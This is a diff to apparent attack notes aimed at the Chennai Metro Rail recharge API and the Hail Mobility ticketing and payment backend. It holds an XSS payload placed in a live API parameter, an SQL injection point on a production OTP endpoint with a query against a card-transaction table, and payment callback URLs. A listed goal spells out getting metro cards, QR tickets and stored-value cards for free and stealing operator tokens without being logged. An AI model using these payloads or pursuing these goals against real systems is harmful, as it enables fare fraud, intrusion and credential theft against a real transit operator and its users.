@@ -46,6 +46,12 @@ http://rechargeapi.chennaimetrorail.org/api/ValidateCard/Getdetails?CMRLsurfacen
 https://rechargeapi.chennaimetrorail.org/api/ValidateCard/Getdetails?CMRLsurfacenumber=%3Cscript%3Ealert(document.domain)%3C/script%3E
 ```
 
+## SQLI
+
+`https://apiprod.chennaimetrorail.org/v4/api/ValidateOTP?OTP=SQLI`
+
+SELECT Price FROM t_tc_cardtransaction WHERE Id = 239714;
+
 ## QR Procedure
 
 ```
@@ -61,3 +67,15 @@ AFter pay
 https://mticket-api.hailmobility.in/paymentengine/api/v1/payment/billdesk/update-transaction/
 https://mticket-api.hailmobility.in/bookingengine/api/v1/booking/redirectonbooking?orderId=9795370&status=FAILURE&type=ticket&oldOrderId=
 ```
+
+## Goal
+
+1. Metro card free (only this stored in cmrl)
+2. QR generate free (hail mobility)
+3. Store value card free (hail moblity spring boot)
+
+## Target Operators?
+
+steal existing operator token without being logged
+
+QRTicketController webview
